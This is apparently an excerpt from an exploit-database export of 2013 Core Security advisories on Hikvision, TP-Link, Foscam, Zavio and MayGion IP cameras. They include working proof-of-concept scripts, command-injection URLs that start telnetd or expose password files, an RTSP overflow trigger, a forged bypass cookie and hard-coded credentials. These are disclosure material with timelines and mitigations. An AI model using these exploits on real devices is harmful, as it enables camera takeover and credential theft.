base_url = 'http://' + target + '/PSIA/System/ConfigurationData'
headers = { 'Authorization': 'Basic ' + base64.b64encode('%s:%s'
%(username,password)) }
print '[*] Attacking %s ' % target
req = urllib2.Request(base_url, None, headers)
try:
response = urllib2.urlopen(req)
config = response.read()
except Exception, e:
print e
return
plaintext = decrypt(config)
print '[*] Writing output file %s' % output
f = open(output, 'w')
f.write(plaintext)
f.close()
user = plaintext[0x45A0:0x45A0+32]
pwd  = plaintext[0x45C0:0x45C0+16]
print 'Probably the admin user is %s and the password is %s' %
(user, pwd)
print ""If it doesn't make any sense, just do a strings of the output
file""
if __name__ == '__main__':
parser = argparse.ArgumentParser()
parser.add_argument('target', action = 'store', help = 'target host
to attack')
parser.add_argument('username', action = 'store', help = 'username
to be used to authenticate against target')
parser.add_argument('password', action = 'store', help = ""username's
password"")
parser.add_argument('output', action = 'store', help = ""filename to
write the plaintext config"")
if len(sys.argv) == 1:
parser.print_help()
sys.exit(1)
options = parser.parse_args()
attack(options.target, options.username, options.password,
options.output)
7.2. *Anonymous User Authentication Bypass*
[CVE-2013-4976] The camera has a built-in anonymous account intended for
guest users, but even when the feature is disabled it could be bypassed
due to the usage of hardcoded credentials:
user: anonymous
password: \177\177\177\177\177\177
The bypass cannot be used directly through the login form but rather by
forging a cookie:
1. Load the login page to generate the initial cookies of the
camera's webapp.
2. Use your preferred tool (for example Firebug on Firefox) to create
a cookie with the name 'userInfoXX' (replace XX with the port where the
webserver is running i.e. 'userInfo80'), path '/' and value
'YW5vbnltb3VzOlwxNzdcMTc3XDE3N1wxNzdcMTc3XDE3Nw=='; this is the tuple
'user:pass' encoded in base64 explained above.
3. Request the URI 'http:/<ipcam>/doc/pages/main.asp', a page that
should not be accessed without authentication if the anonymous user is
disabled.
There are several references to those hardcoded credentials in the cgis,
but in particular the following snippet was found in
'/doc/pages/scripts/login.js'::
107: function DoLogin(){
166:
$.cookie('userInfo'+m_lHttpPort,m_szUserPwdValue==""""?Base64.encode(""anonymous:\177\177\177\177\177\177""
):m_szUserPwdValue);
This bypass is not completely useful per se since all the interesting
requests are actually handled by the PSIA (Physical Security
Interoperability Alliance's) API. Nevertheless, if it is ever combined
with a privilege escalation it would allow remote attacker to control
the camera without proper credentials.
7.3. *Buffer Overflow in the RTSP Packet Handler*
[CVE-2013-4977] The following Python script sends a specially crafted
packet that triggers a buffer overrun condition when handling the
'Range' parameter of a RTSP transaction. As a result, the process
handling the communication crashes and the Watchdog service issues a
full restart. No authentication is required to exploit this
vulnerability and it would possible lead to a remote code execution.
import socket
HOST = '192.168.1.100'
PORT = 554
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
trigger_pkt =  ""PLAY rtsp://%s/ RTSP/1.0\r\n"" % HOST
trigger_pkt += ""CSeq: 7\r\n""
trigger_pkt += ""Range:
npt=Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9aLSaLSaLS\r\n""
trigger_pkt += ""User-Agent: VLC media player (LIVE555 Streaming Media
v2010.02.10)\r\n\r\n""
s.sendall(trigger_pkt)
print ""Packet sent""
data = s.recv(1024)
print 'Received', repr(data), ""\r\n""
s.close()
8. *Report Timeline*
. 2013-07-08:
Core attempts to report the vulnerability using the Hikvision official
contact addresses [3]. No reply received.
. 2013-07-15:
Core attempts to contact vendor.
. 2013-07-22:
Core attempts to contact vendor.
. 2013-07-30:
Core attempts to contact vendor.
. 2013-08-06:
Advisory CORE-2013-0708 published as 'user release'.
9. *References*
[1] Hikvision DS-2CD7153-E Network Mini Dome Camera,
[2] Hikvision IP cameras using firmware v4.1.0 b130111:
DS-2CD833F-E DS-2CD893PF-E DS-2CD893PFWD-E DS-2CD893NF-E
DS-2CD893NFWD-E DS-2CD863PF-E DS-2CD863NF-E DS-2CD864F-E DS-2CD864FWD-E
DS-2CD853F-E DS-2CD855F-E DS-2CD854F-E DS-2CD854FWD-E DS-2CD883F-E
DS-2CD733F-E DS-2CD733F-EZ DS-2CD793PF-E DS-2CD793PF-EZ DS-2CD793PFWD-E
DS-2CD793PFWD-EZ DS-2CD793NF-E DS-2CD793NF-EZ DS-2CD793NFWD-E
DS-2CD793NFWD-EZ DS-2CD763PF-E DS-2CD763PF-EZ DS-2CD763NF-E
DS-2CD763NF-EZ DS-2CD764F-E DS-2CD764F-EZ DS-2CD764FWD-E DS-2CD764FWD-EZ
DS-2CD753F-E DS-2CD753F-EZ DS-2CD755F-E DS-2CD755F-EZ DS-2CD754F-E
DS-2CD754F-EZ DS-2CD754FWD-E DS-2CD783F-E DS-2CD783F-EZ DS-2CD733F-EI
DS-2CD733F-EIZ DS-2CD793PF-EI DS-2CD793PF-EIZ DS-2CD793PFWD-EI
DS-2CD793PFWD-EIZ DS-2CD793NF-EI DS-2CD793NF-EIZ DS-2CD793NFWD-EI
DS-2CD793NFWD-EIZ DS-2CD763PF-EI DS-2CD763PF-EIZ DS-2CD763NF-EI
DS-2CD763NF-EIZ DS-2CD764F-EI DS-2CD764F-EIZ DS-2CD764FWD-EI
DS-2CD764FWD-EIZ DS-2CD753F-EI DS-2CD753F-EIZ DS-2CD755F-EI
DS-2CD755F-EIZ DS-2CD754F-EI DS-2CD754F-EIZ DS-2CD754FWD-EI
DS-2CD783F-EI DS-2CD783F-EIZ DS-2CD7233F-EZ DS-2CD7233F-EZH
DS-2CD7233F-EZS DS-2CD7233F-EZHS DS-2CD7293PF-EZ DS-2CD7293PF-EZH
DS-2CD7293PFWD-EZ DS-2CD7293PFWD-EZH DS-2CD7293NF-EZ DS-2CD7293NF-EZH
DS-2CD7293NFWD-EZ DS-2CD7293NFWD-EZH DS-2CD7263PF-EZ DS-2CD7263PF-EZH
DS-2CD7263PF-EZS DS-2CD7263PF-EZHS DS-2CD7263NF-EZ DS-2CD7263NF-EZH
DS-2CD7263NF-EZS DS-2CD7263NF-EZHS DS-2CD7264FWD-EZ DS-2CD7264FWD-EZH
DS-2CD7253F-EZ DS-2CD7253F-EZH DS-2CD7253F-EZS DS-2CD7253F-EZHS
DS-2CD7255F-EZ DS-2CD7255F-EZH DS-2CD7254F-EZ DS-2CD7254F-EZH
DS-2CD7254F-EZS DS-2CD7254F-EZHS DS-2CD7233F-EIZ DS-2CD7233F-EIZH
DS-2CD7233F-EIZS DS-2CD7233F-EIZHS DS-2CD7293PF-EIZ DS-2CD7293PF-EIZH
DS-2CD7293PFWD-EIZ DS-2CD7293PFWD-EIZH DS-2CD7293NF-EIZ DS-2CD7293NF-EZH
DS-2CD7293NFWD-EIZ DS-2CD7293NFWD-EZH DS-2CD7263PF-EIZ DS-2CD7263PF-EIZH
DS-2CD7263PF-EIZH DS-2CD7263PF-EIZHS DS-2CD7263NF-EIZ DS-2CD7263NF-EIZH
DS-2CD7263NF-EIZH DS-2CD7263NF-EIZHS DS-2CD7264FWD-EIZ
DS-2CD7264FWD-EIZH DS-2CD7253F-EIZ DS-2CD7253F-EIZH DS-2CD7253F-EIZS
DS-2CD7253F-EIZHS DS-2CD7255F-EIZ DS-2CD7255F-EIZH DS-2CD7254F-EIZ
DS-2CD7254F-EIZH DS-2CD7254F-EIZH DS-2CD7254F-EIZHS DS-2CD7133-E
DS-2CD8133F-E DS-2CD8133F-EI DS-2CD7164-E DS-2CD7153-E DS-2CD8153F-E
DS-2CD8153F-EI DS-2CD8233F-E DS-2CD8233F-ES DS-2CD8264F-E
DS-2CD8264FWD-E DS-2CD8264FWD-ES DS-2CD8253F-E DS-2CD8253F-ES
DS-2CD8255F-E DS-2CD8254F-E DS-2CD8254F-ES DS-2CD8283F-E DS-2CD8283F-ES
DS-2CD8233F-EI DS-2CD8233F-EIS DS-2CD8264F-EI DS-2CD8264FWD-EI
DS-2CD8264FWD-EIS DS-2CD8253F-EI DS-2CD8253F-EIS DS-2CD8255F-EI
DS-2CD8254F-EI DS-2CD8254F-EIS DS-2CD8283F-EI DS-2CD8283F-EIS
DS-2CD8433F-EI DS-2CD8464F-EI.
[3] Hikvision contact page,
10. *About CoreLabs*
CoreLabs, the research center of Core Security Technologies, is charged
with anticipating the future needs and requirements for information
security technologies. We conduct our research in several important
areas of computer security including system vulnerabilities, cyber
attack planning and simulation, source code auditing, and cryptography.
Our results include problem formalization, identification of
vulnerabilities, novel solutions and prototypes for new technologies.
CoreLabs regularly publishes security advisories, technical papers,
project information and shared software tools for public use at:
11. *About Core Security Technologies*
Core Security Technologies enables organizations to get ahead of threats
with security test and measurement solutions that continuously identify
and demonstrate real-world exposures to their most critical assets. Our
customers can gain real visibility into their security standing, real
validation of their security controls, and real metrics to more
effectively secure their organizations.
Core Security's software solutions build on over a decade of trusted
research and leading-edge threat expertise from the company's Security
Consulting Services, CoreLabs and Engineering groups. Core Security
Technologies can be reached at +1 (617) 399-6980 or on the Web at:
12. *Disclaimer*
The contents of this advisory are copyright (c) 2013 Core Security
Technologies and (c) 2013 CoreLabs, and are licensed under a Creative
Commons Attribution Non-Commercial Share-Alike 3.0 (United States)
License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/
13. *PGP/GPG Keys*
This advisory has been signed with the GPG key of Core Security
Technologies advisories team, which is available for download at"
2013-08-02,WebApps,Hardware,Core Security,TP-Link TL-SC3171 IP Cameras,Multiple Vulnerabilities,"http://corelabs.coresecurity.com/
http://www.coresecurity.com/advisories/multiple-vulnerabilities-tp-link-tl-sc3171-ip-cameras
http://www.tp-link.com/en/products/details/?categoryid=230&model=TL-SC3171.
http://seclists.org/fulldisclosure/2013/Jun/84.
http://www.coresecurity.com/advisories/multiple-vulnerabilities-tp-link-tl-sc3171-ip-cameras.
http://corelabs.coresecurity.com.
http://www.coresecurity.com.
http://www.coresecurity.com/files/attachments/core_security_advisories.asc.","Core Security - Corelabs Advisory
Multiple Vulnerabilities in TP-Link TL-SC3171 IP Cameras
1. *Advisory Information*
Title: Multiple Vulnerabilities in TP-Link TL-SC3171 IP Cameras
Advisory ID: CORE-2013-0618
Advisory URL:
Date published: 2013-07-30
Date of last update: 2013-07-30
Vendors contacted: TP-Link
Release mode: Coordinated release
2. *Vulnerability Information*
Class: OS command injection [CWE-78], Use of hard-coded credentials
[CWE-798], Authentication Bypass Issues [CWE-592], Missing
Authentication for Critical Function [CWE-306]
Impact: Code execution, Security bypass
Remotely Exploitable: Yes
Locally Exploitable: No
CVE Name: CVE-2013-2578, CVE-2013-2579, CVE-2013-2580, CVE-2013-2581
3. *Vulnerability Description*
Multiple vulnerabilities have been found in TP-Link TL-SC3171 [1] IP
camera running firmware version LM.1.6.18P12_sign5 that could allow an
attacker:
1. [CVE-2013-2578] to execute arbitrary commands through the file
'/cgi-bin/admin/servetest'.
2. [CVE-2013-2579] to execute arbitrary commands in a shell using
hard-coded credentials.
3. [CVE-2013-2580] to perform unauthenticated remote file uploads.
5. [CVE-2013-2581] to perform unauthenticated remote firmware upgrades.
3.1. *Attack Paths*
There are several attack paths that can be exploited by combining these
vulnerabilities with other ones discovered by Eliezer Varade Lopez,
Javier Repiso Sanchez and Jonas Ropero Castillo [2]. Additional attack
paths are available, but the ones listed here allow understanding how an
attacker could compromise the affected device.
3.1.1. *Attack Path I*
(Authentication: none)
1. Upload a rooted firmware exploiting [CVE-2013-2581].
2. Reboot the device by exploiting 'http://<ip-cam>/cgi-bin/reboot'[2].
3.1.2. *Attack Path II*
(Authentication: bypassed)
1. Reset the device to its factory defaults exploiting
'http://<ip-cam>/cgi-bin/hardfactorydefault'[2]. After this step, the
authentication can by bypassed by using 'admin:admin' as a valid
'username:password'.
2. Reboot the device by exploiting 'http://<ip-cam>/cgi-bin/reboot'[2].
3. Start the Telnet service exploiting [CVE-2013-2578].
4. Login to the Telnet service using user 'qmik' (no password)
[CVE-2013-2579], and use the device as a pivoting point.
4. *Vulnerable Packages*
Tests and PoC were run on:
. TP-Link TL-SC3171 IP camera running firmware version
LM.1.6.18P12_sign5.
. Other TP-Link cameras and firmware versions are probably affected
too, but they were not checked.
5. *Vendor Information, Solutions and Workarounds*
Vendor provides the links to (pre-release) patched firmware versions
[3]. The final official versions will be released in the next few days.
Please, contact TP-Link for further information.
6. *Credits*
These vulnerabilities were discovered by Flavio de Cristofaro and
researched with the help of Andres Blanco from Core Security
Technologies. The publication of this advisory was coordinated by
Fernando Miranda from Core Advisories Team.
7. *Technical Description / Proof of Concept Code*
7.1. *OS Command Injection in servetest*
[CVE-2013-2578] The file '/cgi-bin/admin/servetest' has an OS command
injection in several of its parameters that can be exploited by an
authenticated user to execute arbitrary commands. The following proof of
concept starts the telnetd service:
GET
/cgi-bin/admin/servetest?cmd=smtp&ServerName=1.1.1.1;/usr/sbin/telnetd;&ServerPort=25&ServerSSL=off&RcptToAddr1=q@q&AdminAddr=q@q
HTTP/1.1
Accept: */*
Accept-Language: en-us
Referer: http://192.168.1.100/progress.htm
If-Modified-Since: Sat, 1 Jan 2000 00:00:00 GMT
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64;
Trident/5.0)
Host: 192.168.1.100
Proxy-Connection: Keep-Alive
Cookie: VideoFmt=1
Authorization: Basic YWRtaW46YWRtaW4=
Content-Length: 2
7.2. *Hard-coded credentials in telnet service*
[CVE-2013-2579] The affected system includes a hard-coded login with no
password which could be used by a remote attacker to access the OS of
the affected device using the built-in telnet service:
username: qmik
password: (none)
The 'qmik' user is allowed to execute the command 'su', allowing the
user to execute arbitrary commands with root level privileges. The
telnet service can be enabled through [CVE-2013-2578].
7.3. *Unauthenticated remote file uploads*
[CVE-2013-2580] The file '/cgi-bin/uploadfile' allows an unauthenticated
user to perform remote file uploads as shown in the following Python PoC:
import requests
fileName = ""lala.tmp""
f = open(fileName, ""w"")
f.write(""lala"")
f.close()
requests.post(""http://192.168.1.100/cgi-bin/uploadfile"",
files={fileName: open(fileName, ""rb"")})
The uploaded file (in this example lala.tmp) will be hosted in the
'/mnt/mtd' directory.
7.4. *Unauthenticated remote firmware upgrades*
[CVE-2013-2581] The file '/cgi-bin/firmwareupgrade' allows an
unauthenticated user to perform remote firmware upgrades as shown in the
following Python POC:
import requests
requests.get(""http://192.168.1.100/cgi-bin/firmwareupgrade?action=preset"")
fileName = ""COM_T01F001_LM.1.6.18P12_sign5_TPL.TL-SC3171.bin""
cookies={""VideoFmt"":""1""}
requests.post(""http://192.168.1.100/cgi-bin/firmwareupgrade?action=preset"",
files={""SetFWFileName"" : (fileName, open(fileName, ""rb""))}, cookies=cookies)
8. *Report Timeline*
. 2013-06-12:
Core Security Technologies notifies the TP-Link team of the vulnerability.
. 2013-06-18:
Core Security Technologies notifies the TP-Link team of the
vulnerability and set the estimated publication date of the advisory for
July 10, 2013.
. 2013-06-19:
TP-Link answers saying that these vulnerabilities are the same as the
ones published on May 28, 2013.
. 2013-06-26:
Core Security Technologies notifies the TP-Link team that these are new,
different, vulnerabilities and sends a draft report with technical
information.
. 2013-06-26:
Vendor acknowledges the receipt of the technical report.
. 2013-07-01:
Vendor requests additional technical information.
. 2013-07-04:
Core re-sends an improved technical report with additional information
regarding possible attack paths [Sec. 3.1].
. 2013-07-10:
First release date missed.
. 2013-07-15:
Core asks for a status update.
. 2013-07-22:
Vendor notifies that a patched firmware version will be released on July
29th.
. 2013-07-22:
Core re-schedules the advisory publication for July 29th.
. 2013-07-26:
Vendor notifies that a (pre-release) patched firmware version is
available [3] and being tested. The final firmware version will be
released in the next few days.
. 2013-07-30:
Advisory CORE-2013-0618 is published.
9. *References*
[1] TP-Link TL-SC3171,
[2] Security Analysis of IP video surveillance cameras,
[3] See the online version,
10. *About CoreLabs*
CoreLabs, the research center of Core Security Technologies, is charged
with anticipating the future needs and requirements for information
security technologies. We conduct our research in several important
areas of computer security including system vulnerabilities, cyber
attack planning and simulation, source code auditing, and cryptography.
Our results include problem formalization, identification of
vulnerabilities, novel solutions and prototypes for new technologies.
CoreLabs regularly publishes security advisories, technical papers,
project information and shared software tools for public use at:
11. *About Core Security Technologies*
Core Security Technologies enables organizations to get ahead of threats
with security test and measurement solutions that continuously identify
and demonstrate real-world exposures to their most critical assets. Our
customers can gain real visibility into their security standing, real
validation of their security controls, and real metrics to more
effectively secure their organizations.
Core Security's software solutions build on over a decade of trusted
research and leading-edge threat expertise from the company's Security
Consulting Services, CoreLabs and Engineering groups. Core Security
Technologies can be reached at +1 (617) 399-6980 or on the Web at:
12. *Disclaimer*
The contents of this advisory are copyright (c) 2013 Core Security
Technologies and (c) 2013 CoreLabs, and are licensed under a Creative
Commons Attribution Non-Commercial Share-Alike 3.0 (United States)
License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/
13. *PGP/GPG Keys*
This advisory has been signed with the GPG key of Core Security
Technologies advisories team, which is available for download at"
2013-07-24,WebApps,Hardware,Core Security,FOSCAM IP-Cameras,Improper Access Restrictions,"http://corelabs.coresecurity.com/
http://www.coresecurity.com/advisories/foscam-ip-cameras-improper-access-restrictions
http://<target_ip>/tmpfs/ddns.conf
http://<target_ip>/tmpfs/config_backup.bin
http://corelabs.coresecurity.com.
http://www.coresecurity.com.
http://www.coresecurity.com/files/attachments/core_security_advisories.asc.","Core Security - Corelabs Advisory
FOSCAM IP-Cameras Improper Access Restrictions
1. *Advisory Information*
Title: FOSCAM IP-Cameras Improper Access Restrictions
Advisory ID: CORE-2013-0613
Advisory URL:
Date published: 2013-07-23
Date of last update: 2013-07-23
Vendors contacted: Foscam
Release mode: User release
2. *Vulnerability Information*
Class: Information Exposure [CWE-200]
Impact: Security bypass
Remotely Exploitable: Yes
Locally Exploitable: No
CVE Name: CVE-2013-2574
3. *Vulnerability Description*
Due to improper access restriction the FOSCAM FI8620 device [1] allows a
remote attacker to browse and access arbitrary files from the following
directories '/tmpfs/' and '/log/' without requiring authentication. This
could allow a remote attacker to obtain valuable information such as
access credentials, Wi-Fi configuration and other sensitive information
in plain text.
The list of affected files includes, but is not limited to, the following:
. 'http://<target_ip>/tmpfs/config_backup.bin'
. 'http://<target_ip>/tmpfs/config_restore.bin'
. 'http://<target_ip>/tmpfs/ddns.conf'
. 'http://<target_ip>/tmpfs/syslog.txt'
. 'http://<target_ip>/log/syslog.txt'
4. *Vulnerable Packages*
. FOSCAM FI8620 PTZ Camera.
. Other Foscam devices based on the same firmware are probably
affected too, but they were not checked.
5. *Non-Vulnerable Packages*
Vendor did not provide details. Contact Foscam for further information.
6. *Vendor Information, Solutions and Workarounds*
There was no official answer from Foscam after several attempts (see
[Sec. 9]); contact vendor for further information. Some mitigation
actions may be do not expose the camera to internet unless absolutely
necessary and have at least one proxy filtering HTTP requests to the
following resources:
. '/tmpfs/config_backup.bin'
. '/tmpfs/config_restore.bin'
. '/tmpfs/ddns.conf'
. '/tmpfs/syslog.txt'
. '/log/syslog.txt'
7. *Credits*
This vulnerability was discovered by Flavio de Cristofaro and researched
with the help of Andres Blanco from Core Security Technologies. The
publication of this advisory was coordinated by Fernando Miranda from
Core Advisories Team.
8. *Technical Description / Proof of Concept Code*
8.1. *Accessing Manufacturer DDNS configuration*
By requesting the following URL using your default web browser:
you will see something like this:
[LoginInfo]
HostName=ddns.myfoscam.org
HostIP=113.105.65.47
Port=8080
UserName=<target username>
Password=<target plain password>
[Domain]
Domain=<target username>.myfoscam.org;
8.2. *Access Credentials Stored in Backup Files*
When a configuration backup is required by an operator/administrator,
the backup is generated in the local folder 'tmpfs' named as
'config_backup.bin'. The binary file is just a dump of the whole
configuration packed as Gzip and can be accessed by accessing the
following URL:
The presence of this temporary file enables an unauthenticated attacker
to download the configuration files which contain usernames, plaintext
passwords (including admin passwords), Wifi configuration including
plain PSK, among other interesting stuff as shown below:
username             = ""admin           ""
password             = ""admin           ""
authtype             = ""15              ""
authgroup            = ""                ""
[user1]
username             = ""user            ""
password             = ""user            ""
authtype             = ""3               ""
authgroup            = ""                ""
[user2]
username             = ""guest           ""
password             = ""guest           ""
authtype             = ""1               ""
authgroup            = ""                ""
It is important to mention that, in order to access the configuration
file previously mentioned, an operator and/or administrator should have
executed the backup process in advance.
9. *Report Timeline*
. 2013-06-12:
Core Security Technologies notifies the Foscam team of the vulnerability.
. 2013-06-12:
Vendor acknowledges the receipt of the email and asks for technical
details.
. 2013-06-13:
A draft report with technical details and a PoC is sent to vendor.
Publication date is set for Jul 3rd, 2013.
. 2013-06-17:
Core asks if the vulnerabilities are confirmed.
. 2013-06-17:
Foscam product team notifies that they have checked CORE's website [2],
but there is no Foscam info.
. 2013-06-18:
Core notifies that the advisory has not been published yet and re-sends
technical details and proof of concept.
. 2013-06-26:
CORE asks for a reply.
. 2013-07-03:
First release date missed.
. 2013-07-03:
Core asks for a reply.
. 2013-07-11:
Core notifies that the issues were reported 1 month ago and there was no
reply since [2013-06-18].
. 2013-07-23:
Core releases the advisory CORE-2013-0613 tagged as user-release.
10. *References*
[1] Foscam FI8620 - http://www.foscam.com/prd_view.aspx?id=176.
[2] CORE Security Advisories http://www.coresecurity.com/grid/advisories.
11. *About CoreLabs*
CoreLabs, the research center of Core Security Technologies, is charged
with anticipating the future needs and requirements for information
security technologies. We conduct our research in several important
areas of computer security including system vulnerabilities, cyber
attack planning and simulation, source code auditing, and cryptography.
Our results include problem formalization, identification of
vulnerabilities, novel solutions and prototypes for new technologies.
CoreLabs regularly publishes security advisories, technical papers,
project information and shared software tools for public use at:
12. *About Core Security Technologies*
Core Security Technologies enables organizations to get ahead of threats
with security test and measurement solutions that continuously identify
and demonstrate real-world exposures to their most critical assets. Our
customers can gain real visibility into their security standing, real
validation of their security controls, and real metrics to more
effectively secure their organizations.
Core Security's software solutions build on over a decade of trusted
research and leading-edge threat expertise from the company's Security
Consulting Services, CoreLabs and Engineering groups. Core Security
Technologies can be reached at +1 (617) 399-6980 or on the Web at:
13. *Disclaimer*
The contents of this advisory are copyright (c) 2013 Core Security
Technologies and (c) 2013 CoreLabs, and are licensed under a Creative
Commons Attribution Non-Commercial Share-Alike 3.0 (United States)
License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/
14. *PGP/GPG Keys*
This advisory has been signed with the GPG key of Core Security
Technologies advisories team, which is available for download at"
2013-06-13,WebApps,Hardware,"Sánchez, Lopez, Castillo",Airlive IP Cameras,Multiple Vulnerabilities,#NAME?,
2013-05-29,WebApps,Hardware,Core Security,Zavio IP Cameras Firmware 1.6.03,Multiple Vulnerabilities,"http://corelabs.coresecurity.com
http://www.coresecurity.com/advisories/zavio-IP-cameras-multiple-vulnerabilities
# MFT: Specify manufacture commands user name and password
http://192.168.1.100/cgi-bin/mft/wireless_mft?ap=travesti;cp%20/var/www/secret.passwd%20/web/html/credenciales
http://192.168.1.100/credenciales
http://192.168.1.100/cgi-bin/admin/param?action=update&General.Time.DateFormat=ymd&General.Time.SyncSource=NTP&General.Time.TimeZone=GMT-06:00/America/Mexico_City&General.Time.NTP.ServerAuto=no&General.Time.NTP.Server=sarasa!de!palermo;/sbin/awpriv%20ra0%20get_site_survey;&General.Time.NTP.Update=01:00:00&General.Time.DayLightSaving.Enabled=on&General.Time.DayLightSaving.Start.Type=date&General.Time.DayLightSaving.Stop.Type=date&General.Time.DayLightSaving.Start.Month=01&General.Time.DayLightSaving.Stop.Month=01&General.Time.DayLightSaving.Start.Week=1&General.Time.DayLightSaving.Stop.Week=1&General.Time.DayLightSaving.Start.Day=01&General.Time.DayLightSaving.Stop.Day=01&General.Time.DayLightSaving.Start.Date=01&General.Time.DayLightSaving.Stop.Date=01&General.Time.DayLightSaving.Start.Hour=00&General.Time.DayLightSaving.Stop.Hour=00&General.Time.DayLightSaving.Start.Min=00&General.Time.DayLightSaving.Stop.Min=00&Image.OSD.Enabled=off
http://corelabs.coresecurity.com.
http://www.coresecurity.com.
http://www.coresecurity.com/files/attachments/core_security_advisories.asc.","Core Security - Corelabs Advisory
Zavio IP Cameras multiple vulnerabilities
1. *Advisory Information*
Title: Zavio IP Cameras multiple vulnerabilities
Advisory ID: CORE-2013-0302
Advisory URL:
Date published: 2013-05-28
Date of last update: 2013-05-28
Vendors contacted: Zavio
Release mode: User release
2. *Vulnerability Information*
Class: Use of hard-coded credentials [CWE-798], OS command injection
[CWE-78], Incorrect default permissions [CWE-276], OS command injection
[CWE-78]
Impact: Code execution, Security bypass
Remotely Exploitable: Yes
Locally Exploitable: No
CVE Name: CVE-2013-2567, CVE-2013-2568, CVE-2013-2569, CVE-2013-2570
3. *Vulnerability Description*
Multiple vulnerabilities have been found in Zavio IP cameras based on
firmware v1.6.03 and below, that could allow an unauthenticated remote
attacker:
1. [CVE-2013-2567] to bypass user web interface authentication using
hard-coded credentials.
2. [CVE-2013-2568] to execute arbitrary commands from the
administration web interface. This flaw can also be used to obtain all
credentials of registered users.
3. [CVE-2013-2569] to access the camera video stream.
4. [CVE-2013-2570] to execute arbitrary commands from the
administration web interface (post authentication only).
4. *Vulnerable Packages*
. Zavio IP cameras based on firmware v1.6.03 and below.
. All tests and PoCs were run on Zavio F3105 [1] and F312A [2] IP
cameras only. Other Zavio cameras and firmware versions are probably
affected too, but they were not checked.
5. *Non-Vulnerable Packages*
. Vendor did not provide details. Contact Zavio for further information.
6. *Vendor Information, Solutions and Workarounds*
There was no official answer from Zavio after several attempts to report
these vulnerabilities (see [Sec. 9]). Contact vendor for further
information.
Some mitigation actions may be:
. Do not expose the camera to Internet unless absolutely necessary.
. Enable RTSP authentication.
. Have at least one proxy filtering HTTP requests to
'manufacture.cgi' and 'wireless_mft.cgi'.
. Check the parameter 'General.Time.NTP.Server' in requests to
'/opt/cgi/view/param'.
7. *Credits*
These vulnerabilities were discovered and researched by Nahuel Riva and
Francisco Falcon from Core Exploit Writers Team. The publication of this
advisory was coordinated by Fernando Miranda from Core Advisories Team.
8. *Technical Description / Proof of Concept Code*
8.1. *Hard-Coded Credentials in Administrative Web Interface*
[CVE-2013-2567] Zavio IP cameras use the Boa web server [3], a popular
tiny server for embedded Linux devices. 'boa.conf' is the Boa
configuration file, and the following account can be found inside:
MFT manufacture erutcafunam
This account is not visible from the user web interface; users are not
aware of the existence and cannot eliminate it. Through this account it
is possible to access two CGI files located in '/cgi-bin/mft/':
1. 'manufacture.cgi'
2. 'wireless_mft.cgi'
The last file contains the OS command injection showed in the following
section.
8.2. *OS Command Injection*
[CVE-2013-2568] The file '/cgi-bin/mft/wireless_mft.cgi', has an OS
command injection in the parameter 'ap' that can be exploited using the
hard-coded credentials showed in the previous section:
username: manufacture
password: erutcafunam
The following proof of concept copies the file where the user
credentials are stored in the web server root directory:
Afterwards, the user credentials can be obtained by requesting:
8.3. *RTSP Authentication Disabled by Default*
[CVE-2013-2569] The RTSP protocol authentication is disabled by default.
Therefore, the live video stream can be accessed by a remote
unauthenticated attacker by requesting:
rtsp://192.168.1.100/video.h264
8.4. *OS Command Injection (Post-auth)*
[CVE-2013-2570] The command injection is located in the function
'sub_C8C8' of the binary '/opt/cgi/view/param'. The vulnerable parameter
is 'General.Time.NTP.Server'. The following proof of concept can be used
to obtain the complete list of access points by executing '/sbin/awpriv
ra0 get_site_survey':
9. *Report Timeline*
. 2013-03-19:
Core Security Technologies notifies the Zavio Tech Support and requests
a security manager to send a draft report regarding these
vulnerabilities. No reply received.
. 2013-05-02:
Core asks Zavio Tech Support for a security manager to send a
confidential report.
. 2013-05-09:
Core asks for a reply.
. 2013-05-14:
Core asks for a reply.
. 2013-05-21:
Core tries to contact vendor for last time without any reply.
. 2013-05-28:
After 5 failed attempts to report the issues, the advisory
CORE-2013-0302 is published as 'user-release'.
10. *References*
[1] http://www.zavio.com/product.php?id=25.
[2] http://zavio.com/product.php?id=23.
[3] http://www.boa.org/.
11. *About CoreLabs*
CoreLabs, the research center of Core Security Technologies, is charged
with anticipating the future needs and requirements for information
security technologies. We conduct our research in several important
areas of computer security including system vulnerabilities, cyber
attack planning and simulation, source code auditing, and cryptography.
Our results include problem formalization, identification of
vulnerabilities, novel solutions and prototypes for new technologies.
CoreLabs regularly publishes security advisories, technical papers,
project information and shared software tools for public use at:
12. *About Core Security Technologies*
Core Security Technologies enables organizations to get ahead of threats
with security test and measurement solutions that continuously identify
and demonstrate real-world exposures to their most critical assets. Our
customers can gain real visibility into their security standing, real
validation of their security controls, and real metrics to more
effectively secure their organizations.
Core Security's software solutions build on over a decade of trusted
research and leading-edge threat expertise from the company's Security
Consulting Services, CoreLabs and Engineering groups. Core Security
Technologies can be reached at +1 (617) 399-6980 or on the Web at:
13. *Disclaimer*
The contents of this advisory are copyright (c) 2013 Core Security
Technologies and (c) 2013 CoreLabs, and are licensed under a Creative
Commons Attribution Non-Commercial Share-Alike 3.0 (United States)
License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/
14. *PGP/GPG Keys*
This advisory has been signed with the GPG key of Core Security
Technologies advisories team, which is available for download at"
2013-05-29,WebApps,Hardware,Core Security,MayGion IP Cameras Firmware 09.27,Multiple Vulnerabilities,"http://corelabs.coresecurity.com/
http://www.coresecurity.com/advisories/maygion-IP-cameras-multiple-vulnerabilities
http://corelabs.coresecurity.com.
http://www.coresecurity.com.
http://www.coresecurity.com/files/attachments/core_security_advisories.asc.","Core Security - Corelabs Advisory
MayGion IP Cameras multiple vulnerabilities
1. *Advisory Information*
Title: MayGion IP Cameras multiple vulnerabilities
Advisory ID: CORE-2013-0322
Advisory URL:
Date published: 2013-05-28
Date of last update: 2013-05-28
Vendors contacted: MayGion
Release mode: Coordinated release
2. *Vulnerability Information*
Class: Path traversal [CWE-22], Buffer overflow [CWE-119]
Impact: Code execution, Security bypass
Remotely Exploitable: Yes
Locally Exploitable: No
CVE Name: CVE-2013-1604, CVE-2013-1605
3. *Vulnerability Description*
Multiple vulnerabilities have been found in MayGion IP cameras [1] based
